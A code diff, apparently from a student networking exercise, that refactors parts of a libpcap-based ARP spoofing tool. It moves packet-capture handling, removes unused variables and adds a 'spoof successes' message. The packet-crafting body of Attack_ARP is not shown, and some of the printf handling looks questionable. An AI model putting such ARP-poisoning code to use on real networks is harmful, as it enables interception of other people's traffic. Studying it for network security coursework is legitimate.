@@ -64,7 +64,7 @@ void My_Ip_Address(char* Ip_store, char* interface)
 bool get_sender_mac(const u_char * packet, char * sender_ip, char * sender_mac)
 {
 	EthArpPacket* header = (EthArpPacket*)packet;
-	printf("%s", header->arp_.sip_);
+	printf("%s\n", header->arp_.sip_);
 	return 1;
 }
 bool check_ip(char* test_ip)
@@ -104,8 +104,14 @@ bool Send_ARP_Request(pcap_t *pcap, ip_mac * mine, char * sender_ip)
 	
 	return 1;
 }
-bool Receive_ARP_Reply(pcap_t * pcap, char * sender_ip, char * sender_mac)
+bool Receive_ARP_Reply(char * my_interface, char * sender_ip, char * sender_mac)
 {
+	char errbuf[PCAP_ERRBUF_SIZE];
+        pcap_t* pcap = pcap_open_live(my_interface, BUFSIZ, 1, 1000, errbuf);
+        if (pcap == NULL) {
+                fprintf(stderr, "pcap_open_live(%s) return null - %s\n", my_interface, errbuf);
+        return 0;
+        }
 	struct pcap_pkthdr* header;
 	const u_char* packet;
 	int32_t res;
@@ -119,6 +125,7 @@ bool Receive_ARP_Reply(pcap_t * pcap, char * sender_ip, char * sender_mac)
 		}
 	}
 	while (get_sender_mac(packet, sender_ip, sender_mac));
+	pcap_close(pcap);
 	return 1;
 }
 void Attack_ARP(pcap_t * pcap,char * sender_ip, char * target_ip, char * sender_mac,ip_mac * mine)
@@ -152,24 +159,25 @@ void my_arp_spoof(char * my_interface, char * sender_ip, char * target_ip, ip_ma
 		return;
 	
 	char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* pcap = pcap_open_live(my_interface, BUFSIZ, 1, 1000, errbuf);
-    if (pcap == NULL) {
+    	pcap_t* pcap = pcap_open_live(my_interface, BUFSIZ, 1, 1000, errbuf);
+    	if (pcap == NULL) {
 		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", my_interface, errbuf);
         return;
-    }
+    	}
 
-	char My_Mac[18];
 	char sender_mac[18];
-	char my_ip[16];
-	My_Mac_Address(My_Mac,my_interface);
 
 	if (!Send_ARP_Request(pcap, mine, sender_ip)) //sender MAC 주소 요청
 		return;
-	if (!Receive_ARP_Reply(pcap, sender_ip,sender_mac))//source MAC 주소 알아내기
+
+	if (!Receive_ARP_Reply(my_interface, sender_ip,sender_mac))//source MAC 주소 알아내기
 		return;
+	
 	Attack_ARP(pcap,sender_ip,target_ip,sender_mac,mine);	// 공격
 
+	printf("from %s to %s arp spoof successes\n",sender_ip, target_ip);
+	
 	pcap_close(pcap);
-
+	
 	return;
 }
